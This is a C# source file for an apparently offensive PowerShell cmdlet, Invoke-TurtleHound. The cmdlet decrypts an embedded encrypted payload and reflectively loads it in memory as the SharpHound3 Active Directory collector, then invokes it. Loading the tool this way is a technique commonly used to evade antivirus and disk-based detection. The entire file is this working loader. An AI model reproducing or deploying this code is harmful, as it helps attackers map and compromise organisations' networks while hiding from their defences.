using System;
using System.Management.Automation;
using System.Reflection;
using TurtleToolKitCrypt;


namespace TurtleToolKit
{
    [Cmdlet(VerbsLifecycle.Invoke, "TurtleHound")] // <- seeting cmdlet name and verbs
    [Alias("INVHOUND")] //<- cmdlet alias
    public class InvokeTurtleHound : Cmdlet
    {
        private Cryptor cryptObj;

        protected override void BeginProcessing()
        {
            base.BeginProcessing();
        }

        // Process each item in pipeline
        protected override void ProcessRecord()
        {
            base.ProcessRecord();
            ExecuteHound();
        }
        // EndProcessing Used to clean up cmdlet
        protected override void EndProcessing() { base.EndProcessing(); }
        // Handle abnormal termination
        protected override void StopProcessing() { base.StopProcessing(); }

        public bool ExecuteHound()
        {
            try
            {
                cryptObj = new Cryptor(TurtleHound.key, TurtleHound.iv);
                var decryptedBytes = cryptObj.DecryptBytes(TurtleHound.encryptedPayload);
                if (decryptedBytes == null)
                {
                    this.WriteWarning("Failed to decrypt bytes");
                    return false;
                }
                var ass = Assembly.Load(decryptedBytes);
                var t = ass.GetType("SharpHound3.SharpHound");
                var c = Activator.CreateInstance(t);
                var m = t.GetMethod("TurtleHound");
                m.Invoke(c, null);
                return true;
            }
            catch (Exception e)
            {
                throw e;
            }
            return true;
        }
    }
}
